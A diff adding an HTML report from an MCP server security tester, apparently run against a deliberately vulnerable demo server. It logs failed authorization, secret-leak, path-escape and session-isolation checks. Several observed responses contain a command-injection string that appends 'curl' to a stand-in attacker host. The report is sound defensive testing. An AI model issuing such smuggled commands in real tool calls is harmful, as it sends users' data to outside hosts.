@@ -1,0 +1,923 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MCP Behaviour Guard - 0760cd326712</title>
+  <style>
+    :root {
+      color-scheme: light dark;
+      --bg: Canvas; --text: CanvasText; --panel: color-mix(in srgb, Canvas 94%, CanvasText 6%);
+      --border: color-mix(in srgb, CanvasText 24%, transparent); --muted: color-mix(in srgb, CanvasText 62%, transparent);
+      --critical:#b71c1c; --high:#d84315; --medium:#ef6c00; --low:#6d4c41; --info:#455a64;
+      --passed:#2e7d32; --failed:#c62828; --error:#ef6c00; --skipped:#616161;
+    }
+    * { box-sizing:border-box; }
+    body { font-family: ui-sans-serif, system-ui, -apple-system, sans-serif; margin:0; background:var(--bg); color:var(--text); }
+    main { max-width:1400px; margin:0 auto; padding:2rem; }
+    header { display:flex; justify-content:space-between; gap:2rem; align-items:flex-start; }
+    h1 { margin:0 0 .4rem; }
+    .summary { display:grid; grid-template-columns:repeat(6,minmax(110px,1fr)); gap:.8rem; margin:2rem 0; }
+    .card { border:1px solid var(--border); border-radius:12px; padding:1rem; background:var(--panel); }
+    .card strong { font-size:1.55rem; display:block; }
+    .table-wrap { overflow-x:auto; border:1px solid var(--border); border-radius:12px; }
+    table { width:100%; border-collapse:collapse; min-width:980px; }
+    th { text-align:left; font-size:.78rem; letter-spacing:.04em; text-transform:uppercase; color:var(--muted); background:var(--panel); }
+    th, td { padding:.85rem; border-bottom:1px solid var(--border); vertical-align:top; }
+    tbody tr:last-child td { border-bottom:0; }
+    tbody tr:hover { background:color-mix(in srgb, CanvasText 4%, transparent); }
+    .badge { display:inline-block; border-radius:999px; padding:.2rem .55rem; font-size:.75rem; font-weight:700; text-transform:uppercase; color:white; }
+    .severity-critical { background:var(--critical); } .severity-high { background:var(--high); }
+    .severity-medium { background:var(--medium); } .severity-low { background:var(--low); } .severity-info { background:var(--info); }
+    .status-passed { color:var(--passed); } .status-failed { color:var(--failed); }
+    .status-error { color:var(--error); } .status-skipped { color:var(--skipped); }
+    details { min-width:260px; }
+    summary { cursor:pointer; font-weight:650; }
+    .details-grid { display:grid; grid-template-columns:1fr 1fr; gap:1rem; margin-top:1rem; }
+    .details-grid section { min-width:0; }
+    .wide { grid-column:1 / -1; }
+    code, pre { font-family:ui-monospace, SFMono-Regular, Menlo, monospace; }
+    pre { white-space:pre-wrap; overflow-wrap:anywhere; background:color-mix(in srgb, CanvasText 7%, transparent); padding:.8rem; border-radius:8px; max-height:380px; overflow:auto; }
+    .meta { color:var(--muted); }
+    .tag { border:1px solid var(--border); border-radius:999px; padding:.25rem .65rem; font-size:.8rem; }
+    .filters { display:flex; flex-wrap:wrap; gap:.6rem; margin:0 0 1rem; }
+    .filters input, .filters select, .filters button { padding:.55rem .65rem; border:1px solid var(--border); border-radius:8px; background:var(--bg); color:var(--text); }
+    .filters button { cursor:pointer; }
+    @media (max-width:900px) { .summary { grid-template-columns:repeat(2,1fr); } .details-grid { grid-template-columns:1fr; } }
+  </style>
+</head>
+<body>
+<main>
+  <header>
+    <div>
+      <h1>MCP Behaviour Guard</h1>
+      <div class="meta">Run 0760cd326712 · stdio:python -m demo.stdio_server.app</div>
+      <div class="meta">2026-07-20T00:42:32.351524+00:00 → 2026-07-20T00:42:48.872007+00:00</div>
+    </div>
+    <span class="tag">deterministic evidence</span>
+  </header>
+
+  <section class="summary">
+    <div class="card"><strong>24</strong>checks</div>
+    <div class="card"><strong>8</strong>critical open</div>
+    <div class="card"><strong>2</strong>high open</div>
+    <div class="card"><strong>14</strong>passed</div>
+    <div class="card"><strong>10</strong>failed/error</div>
+    <div class="card"><strong>24</strong>tool calls</div>
+  </section>
+
+  <h2>Results</h2>
+  <div class="filters">
+    <input id="search" type="search" placeholder="Filter test, category or title" aria-label="Filter findings">
+    <select id="severity" aria-label="Filter severity">
+      <option value="">All severities</option>
+      <option value="critical">Critical</option><option value="high">High</option>
+      <option value="medium">Medium</option><option value="low">Low</option><option value="info">Info</option>
+    </select>
+    <select id="status" aria-label="Filter status">
+      <option value="">All statuses</option>
+      <option value="failed">Failed</option><option value="error">Error</option>
+      <option value="passed">Passed</option><option value="skipped">Skipped</option>
+    </select>
+    <button id="open-all" type="button">Expand visible</button>
+    <button id="close-all" type="button">Collapse all</button>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Severity</th><th>Status</th><th>Test</th><th>Category</th><th>Result</th><th>Details</th></tr></thead>
+      <tbody id="findings">
+      
+        <tr data-severity="critical" data-status="failed" data-search="auth-diagnostics-anonymous authorization anonymous access to diagnostics follows the contract">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>AUTH-DIAGNOSTICS-ANONYMOUS</code></td>
+          <td>authorization</td>
+          <td>anonymous access to diagnostics follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "agent_token": "DEMO_FAKE_SECRET",
+    "identity": "anonymous",
+    "role": "anonymous"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Enforce authorization at the server boundary and again inside sensitive tool handlers.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="auth-get-workspace-note-anonymous authorization anonymous access to get_workspace_note follows the contract">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>AUTH-GET-WORKSPACE-NOTE-ANONYMOUS</code></td>
+          <td>authorization</td>
+          <td>anonymous access to get_workspace_note follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "note": "access-matrix-note"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Enforce authorization at the server boundary and again inside sensitive tool handlers.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="auth-run-project-task-anonymous authorization anonymous access to run_project_task follows the contract">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>AUTH-RUN-PROJECT-TASK-ANONYMOUS</code></td>
+          <td>authorization</td>
+          <td>anonymous access to run_project_task follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "accepted": true,
+    "command": "python -m pytest ; curl https://attacker.invalid/collect",
+    "executed": false
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Enforce authorization at the server boundary and again inside sensitive tool handlers.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="auth-run-project-task-restricted-agent authorization restricted_agent access to run_project_task follows the contract">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>AUTH-RUN-PROJECT-TASK-RESTRICTED-AGENT</code></td>
+          <td>authorization</td>
+          <td>restricted_agent access to run_project_task follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "accepted": true,
+    "command": "python -m pytest ; curl https://attacker.invalid/collect",
+    "executed": false
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Enforce authorization at the server boundary and again inside sensitive tool handlers.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="auth-set-workspace-note-anonymous authorization anonymous access to set_workspace_note follows the contract">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>AUTH-SET-WORKSPACE-NOTE-ANONYMOUS</code></td>
+          <td>authorization</td>
+          <td>anonymous access to set_workspace_note follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "stored": true
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Enforce authorization at the server boundary and again inside sensitive tool handlers.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="auth-workspace-read-anonymous authorization anonymous access to workspace_read follows the contract">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>AUTH-WORKSPACE-READ-ANONYMOUS</code></td>
+          <td>authorization</td>
+          <td>anonymous access to workspace_read follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "content": "Safe local-agent workspace file.\n",
+    "identity": "anonymous",
+    "path": "/mcp-behaviour-guard/demo_runtime/stdio/workspace/README.txt"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Enforce authorization at the server boundary and again inside sensitive tool handlers.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="stdio-env-leak-001 policy_boundary diagnostics do not expose inherited local-agent secrets.">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>STDIO-ENV-LEAK-001</code></td>
+          <td>policy_boundary</td>
+          <td>Diagnostics do not expose inherited local-agent secrets.</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "checks": [
+    {
+      "env_names": [
+        "DEMO_AGENT_TOKEN"
+      ],
+      "type": "response_not_contains_env"
+    }
+  ]
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "agent_token": "DEMO_FAKE_SECRET",
+    "identity": "restricted_agent",
+    "role": "read_only"
+  },
+  "violations": [
+    {
+      "check": "response_not_contains_env",
+      "leaked_environment_variables": [
+        "DEMO_AGENT_TOKEN"
+      ]
+    }
+  ]
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Validate paths after canonicalisation, minimize inherited environment, and return only contract-approved data.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="critical" data-status="failed" data-search="stdio-path-boundary-001 policy_boundary workspace reads cannot escape into adjacent agent files.">
+          <td><span class="badge severity-critical">critical</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>STDIO-PATH-BOUNDARY-001</code></td>
+          <td>policy_boundary</td>
+          <td>Workspace reads cannot escape into adjacent agent files.</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "checks": [
+    {
+      "type": "denied"
+    },
+    {
+      "response_path": "path",
+      "roots": [
+        "demo_runtime/stdio/workspace"
+      ],
+      "type": "path_within"
+    }
+  ]
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "content": "local-agent-secret-material\n",
+    "identity": "restricted_agent",
+    "path": "/mcp-behaviour-guard/demo_runtime/stdio/agent-secrets.txt"
+  },
+  "violations": [
+    {
+      "check": "denied",
+      "reason": "call was allowed"
+    },
+    {
+      "allowed_roots": [
+        "demo_runtime/stdio/workspace"
+      ],
+      "check": "path_within",
+      "observed": "/mcp-behaviour-guard/demo_runtime/stdio/agent-secrets.txt",
+      "response_path": "path"
+    }
+  ]
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Validate paths after canonicalisation, minimize inherited environment, and return only contract-approved data.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="high" data-status="failed" data-search="behaviour-run-project-task runtime_behaviour run_project_task performs only declared side effects">
+          <td><span class="badge severity-high">high</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>BEHAVIOUR-RUN-PROJECT-TASK</code></td>
+          <td>runtime_behaviour</td>
+          <td>run_project_task performs only declared side effects</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed_filesystem_writes": [],
+  "allowed_network_destinations": [],
+  "forbidden_side_effects": [],
+  "read_only": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "events": [
+    {
+      "details": {
+        "command": "python -m pytest ; curl https://attacker.invalid/collect",
+        "executed": false,
+        "identity": "local_developer",
+        "tool": "run_project_task"
+      },
+      "kind": "process_execution",
+      "observer": "stdio_audit"
+    }
+  ],
+  "violations": [
+    {
+      "event": {
+        "details": {
+          "command": "python -m pytest ; curl https://attacker.invalid/collect",
+          "executed": false,
+          "identity": "local_developer",
+          "tool": "run_project_task"
+        },
+        "kind": "process_execution",
+        "observer": "stdio_audit"
+      },
+      "reason": "process command is not allowlisted"
+    }
+  ]
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Remove undeclared actions or explicitly constrain and document the required destinations and paths.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="high" data-status="failed" data-search="stdio-session-isolation-001 session_isolation independent mcp clients do not share session state">
+          <td><span class="badge severity-high">high</span></td>
+          <td><strong class="status-failed">failed</strong></td>
+          <td><code>STDIO-SESSION-ISOLATION-001</code></td>
+          <td>session_isolation</td>
+          <td>Independent MCP clients do not share session state</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "reader_contains_writer_marker": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "marker_leaked": true,
+  "reader_allowed": true,
+  "reader_response": {
+    "note": "guard-e11070b76ee4434184f12b5f707545d8"
+  },
+  "writer_allowed": true
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                <section class="wide"><h4>Remediation</h4><p>Key mutable state by authenticated principal and MCP session, and clear it when sessions terminate.</p></section>
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-diagnostics-local-developer authorization local_developer access to diagnostics follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-DIAGNOSTICS-LOCAL-DEVELOPER</code></td>
+          <td>authorization</td>
+          <td>local_developer access to diagnostics follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "agent_token": "DEMO_FAKE_SECRET",
+    "identity": "local_developer",
+    "role": "developer"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-diagnostics-restricted-agent authorization restricted_agent access to diagnostics follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-DIAGNOSTICS-RESTRICTED-AGENT</code></td>
+          <td>authorization</td>
+          <td>restricted_agent access to diagnostics follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "agent_token": "DEMO_FAKE_SECRET",
+    "identity": "restricted_agent",
+    "role": "read_only"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-get-workspace-note-local-developer authorization local_developer access to get_workspace_note follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-GET-WORKSPACE-NOTE-LOCAL-DEVELOPER</code></td>
+          <td>authorization</td>
+          <td>local_developer access to get_workspace_note follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "note": "access-matrix-note"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-get-workspace-note-restricted-agent authorization restricted_agent access to get_workspace_note follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-GET-WORKSPACE-NOTE-RESTRICTED-AGENT</code></td>
+          <td>authorization</td>
+          <td>restricted_agent access to get_workspace_note follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "note": "access-matrix-note"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-run-project-task-local-developer authorization local_developer access to run_project_task follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-RUN-PROJECT-TASK-LOCAL-DEVELOPER</code></td>
+          <td>authorization</td>
+          <td>local_developer access to run_project_task follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "accepted": true,
+    "command": "python -m pytest ; curl https://attacker.invalid/collect",
+    "executed": false
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-set-workspace-note-local-developer authorization local_developer access to set_workspace_note follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-SET-WORKSPACE-NOTE-LOCAL-DEVELOPER</code></td>
+          <td>authorization</td>
+          <td>local_developer access to set_workspace_note follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "stored": true
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-set-workspace-note-restricted-agent authorization restricted_agent access to set_workspace_note follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-SET-WORKSPACE-NOTE-RESTRICTED-AGENT</code></td>
+          <td>authorization</td>
+          <td>restricted_agent access to set_workspace_note follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "stored": true
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-workspace-read-local-developer authorization local_developer access to workspace_read follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-WORKSPACE-READ-LOCAL-DEVELOPER</code></td>
+          <td>authorization</td>
+          <td>local_developer access to workspace_read follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "content": "Safe local-agent workspace file.\n",
+    "identity": "local_developer",
+    "path": "/mcp-behaviour-guard/demo_runtime/stdio/workspace/README.txt"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="auth-workspace-read-restricted-agent authorization restricted_agent access to workspace_read follows the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>AUTH-WORKSPACE-READ-RESTRICTED-AGENT</code></td>
+          <td>authorization</td>
+          <td>restricted_agent access to workspace_read follows the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "allowed": true,
+  "error": null,
+  "response": {
+    "content": "Safe local-agent workspace file.\n",
+    "identity": "restricted_agent",
+    "path": "/mcp-behaviour-guard/demo_runtime/stdio/workspace/README.txt"
+  }
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="behaviour-diagnostics runtime_behaviour diagnostics performs only declared side effects">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>BEHAVIOUR-DIAGNOSTICS</code></td>
+          <td>runtime_behaviour</td>
+          <td>diagnostics performs only declared side effects</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed_filesystem_writes": [],
+  "allowed_network_destinations": [],
+  "forbidden_side_effects": [],
+  "read_only": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "events": [],
+  "violations": []
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="behaviour-get-workspace-note runtime_behaviour get_workspace_note performs only declared side effects">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>BEHAVIOUR-GET-WORKSPACE-NOTE</code></td>
+          <td>runtime_behaviour</td>
+          <td>get_workspace_note performs only declared side effects</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed_filesystem_writes": [],
+  "allowed_network_destinations": [],
+  "forbidden_side_effects": [],
+  "read_only": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "events": [],
+  "violations": []
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="behaviour-set-workspace-note runtime_behaviour set_workspace_note performs only declared side effects">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>BEHAVIOUR-SET-WORKSPACE-NOTE</code></td>
+          <td>runtime_behaviour</td>
+          <td>set_workspace_note performs only declared side effects</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed_filesystem_writes": [
+    "*/demo_runtime/stdio/shared-agent-note.txt"
+  ],
+  "allowed_network_destinations": [],
+  "forbidden_side_effects": [],
+  "read_only": false
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "events": [
+    {
+      "details": {
+        "path": "/mcp-behaviour-guard/demo_runtime/stdio/shared-agent-note.txt",
+        "tool": "set_workspace_note"
+      },
+      "kind": "filesystem_write",
+      "observer": "stdio_audit"
+    }
+  ],
+  "violations": []
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="behaviour-workspace-read runtime_behaviour workspace_read performs only declared side effects">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>BEHAVIOUR-WORKSPACE-READ</code></td>
+          <td>runtime_behaviour</td>
+          <td>workspace_read performs only declared side effects</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "allowed_filesystem_writes": [],
+  "allowed_network_destinations": [],
+  "forbidden_side_effects": [],
+  "read_only": true
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "events": [],
+  "violations": []
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "trace": "traces/mcp-trace.jsonl"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+        <tr data-severity="info" data-status="passed" data-search="inventory-001 capability_drift discovered tool inventory matches the contract">
+          <td><span class="badge severity-info">info</span></td>
+          <td><strong class="status-passed">passed</strong></td>
+          <td><code>INVENTORY-001</code></td>
+          <td>capability_drift</td>
+          <td>Discovered tool inventory matches the contract</td>
+          <td>
+            <details>
+              <summary>Expand evidence</summary>
+              <div class="details-grid">
+                <section><h4>Expected</h4><pre>{
+  "tools": [
+    "diagnostics",
+    "get_workspace_note",
+    "run_project_task",
+    "set_workspace_note",
+    "workspace_read"
+  ]
+}</pre></section>
+                <section><h4>Observed</h4><pre>{
+  "missing": [],
+  "tools": [
+    "diagnostics",
+    "get_workspace_note",
+    "run_project_task",
+    "set_workspace_note",
+    "workspace_read"
+  ],
+  "unexpected": []
+}</pre></section>
+                <section class="wide"><h4>Evidence</h4><pre>{
+  "inventory": "tool-inventory.json"
+}</pre></section>
+                
+              </div>
+            </details>
+          </td>
+        </tr>
+      
+      </tbody>
+    </table>
+  </div>
+</main>
+<script>
+(() => {
+  const search = document.getElementById('search');
+  const severity = document.getElementById('severity');
+  const status = document.getElementById('status');
+  const rows = [...document.querySelectorAll('#findings tr')];
+  const openAll = document.getElementById('open-all');
+  const closeAll = document.getElementById('close-all');
+  const apply = () => {
+    const query = search.value.trim().toLowerCase();
+    rows.forEach(row => {
+      const visible = (!query || row.dataset.search.includes(query)) &&
+        (!severity.value || row.dataset.severity === severity.value) &&
+        (!status.value || row.dataset.status === status.value);
+      row.hidden = !visible;
+    });
+  };
+  [search, severity, status].forEach(control => control.addEventListener('input', apply));
+  openAll.addEventListener('click', () => rows.filter(row => !row.hidden).forEach(row => row.querySelector('details').open = true));
+  closeAll.addEventListener('click', () => rows.forEach(row => row.querySelector('details').open = false));
+})();
+</script>
+</body>
+</html>
